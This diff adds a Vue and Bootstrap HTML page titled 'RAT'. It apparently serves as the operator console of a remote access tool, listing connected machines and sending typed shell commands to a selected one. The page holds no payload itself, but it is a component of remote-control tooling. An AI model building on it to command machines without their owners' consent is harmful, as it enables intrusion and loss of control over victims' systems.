@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>RAT</title>
+    <script src="js/vue.global.js"></script>
+    <script src="js/axios.min.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link href="css/index.css" rel="stylesheet">
+</head>
+<body>
+
+<div class="container">
+    <div class="row">
+        <div class="col-3">
+            <div class="card" style="height: 581px;">
+                <div class="card-header">
+                    Connections
+                    <a class="float-end" @click="list()">Refresh</a>
+                </div>
+                <div v-if="this.connections.length == 0" class="text-center">No connections</div>
+                <div v-else class="list-group list-group-flush border-bottom overflow-scroll">
+                    <a class="list-group-item list-group-item-action" v-for="connection, index in connections"
+                       data-bs-toggle="list" @click="this.target=parseInt(index); this.result=''; getcwd()">{{connection}}</a>
+                </div>
+            </div>
+        </div>
+        <div class="col-9">
+            <div class="card">
+                <div class="card-header">
+                    {{this.connections[this.target]==null ? 'Not connected' : this.connections[this.target]}}
+                    <a class="float-end" @click="this.result=''">Clear</a>
+                </div>
+                <div id="result" class="card-body border-bottom overflow-scroll" style="height: 500px;">
+                    <div style="word-break: break-all; white-space: pre-wrap">
+                        {{result}}{{(cwd == null ? '' : cwd) + '> ' + command}}
+                    </div>
+                </div>
+                <div class="input-group">
+                    <input id="command" class="form-control border-0" placeholder="Command" v-model="command" @keyup.enter="execute">
+                    <button id="execute" class="btn btn-primary" @click="execute()">Send</button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+</body>
+
+<script src="js/index.js"></script>
+</html>
